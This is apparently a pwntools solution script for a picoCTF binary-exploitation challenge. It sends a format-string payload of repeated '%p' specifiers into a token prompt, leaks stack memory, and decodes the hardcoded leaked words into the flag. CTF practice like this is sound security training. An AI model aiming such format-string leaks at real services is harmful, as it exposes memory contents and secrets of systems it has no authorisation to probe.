#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 53996
HOST = "wily-courier.picoctf.net"
# exe = context.binary = ELF('./filebin', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

p = remote(HOST, PORT)

p.recvuntil(b'portfolio\n')
p.sendline(b'1')

p.recvuntil(b'API token?\n')
payload = b"%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|"
p.sendline(payload)
p.recvuntil(b"token:\n")

# data = p.recvline()[:-1]
data = '0x988d3d0|0x804b000|0x80489c3|0xf6ec6d80|0xffffffff|0x1|0x988b160|0xf6ecf110|0xf6ec6dc7|(nil)|0x988c180|0x2|0x988d3b0|0x988d3d0|0x6f636970|0x7b465443|0x306c5f49|0x345f7435|0x6d5f6c6c|0x306d5f79|0x5f79336e|0x39333865|0x34383233|0xff000a7d|'

print("data_leak: ", data)
for h in data.split('|'):
    if h.startswith('0x'):
        try:
            bytes_data = bytes.fromhex(h[2:].rjust(8,'0'))[::-1]
            print(''.join(chr(b) for b in bytes_data if 32 <= b < 127), end='')
        except:
            pass

print("\n\n\n\n\n\n\n")
p.interactive()
